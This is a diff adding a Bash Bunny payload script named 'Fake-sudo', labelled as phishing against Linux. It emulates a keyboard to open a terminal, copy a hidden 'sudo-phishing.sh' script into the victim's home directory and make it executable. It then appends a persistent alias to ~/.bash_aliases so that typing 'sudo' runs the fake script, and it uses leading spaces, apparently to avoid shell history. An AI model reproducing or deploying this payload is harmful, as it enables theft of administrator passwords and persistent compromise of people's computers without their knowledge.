@@ -1,0 +1,86 @@
+#!/bin/bash
+#
+# Title:            Fake-sudo
+#
+# Description:      
+#                   This program creates a fake "sudo" 
+#                   command by defining an persistent alias.
+#
+# Author:           TW-D
+# Version:          1.1
+# Category:         Phishing
+# Target:           Linux
+# Attackmodes:      HID and STORAGE
+#
+# TESTED ON
+# ===============
+# Ubuntu 20.04.4 LTS x86_64 (Xfce)
+#
+# STATUS
+# ===============
+# Magenta solid ................................... SETUP
+# Yellow single blink ............................. ATTACK
+# Yellow double blink ............................. STAGE2
+# Yellow triple blink ............................. STAGE3
+# Yellow quadruple blink .......................... STAGE4
+# White fast blink ................................ CLEANUP
+# Green 1000ms VERYFAST blink followed by SOLID ... FINISH
+
+######## INITIALIZATION ########
+
+readonly BB_LABEL="BashBunny"
+
+######## SETUP ########
+
+LED SETUP
+
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+udisk mount
+
+######## ATTACK ########
+
+LED ATTACK
+
+Q DELAY 7000
+Q CTRL-ALT t
+Q DELAY 7000
+
+LED STAGE2
+
+Q STRING " cd /media/\${USER}/${BB_LABEL}/payloads/${SWITCH_POSITION}/"
+Q ENTER
+Q DELAY 1500
+
+Q STRING " cp ./sudo-phishing.sh ~/.sudo_phishing.sh"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE3
+
+Q STRING " chmod +x ~/.sudo_phishing.sh"
+Q ENTER
+Q DELAY 1500
+
+Q STRING " printf \"\\nalias sudo='~/.sudo_phishing.sh'\\n\" >> ~/.bash_aliases"
+Q ENTER
+Q DELAY 1500
+
+LED STAGE4
+
+Q STRING " exit"
+Q ENTER
+Q DELAY 1500
+
+######## CLEANUP ########
+
+LED CLEANUP
+
+sync
+udisk unmount
+
+######## FINISH ########
+
+LED FINISH
+
+shutdown -h 0
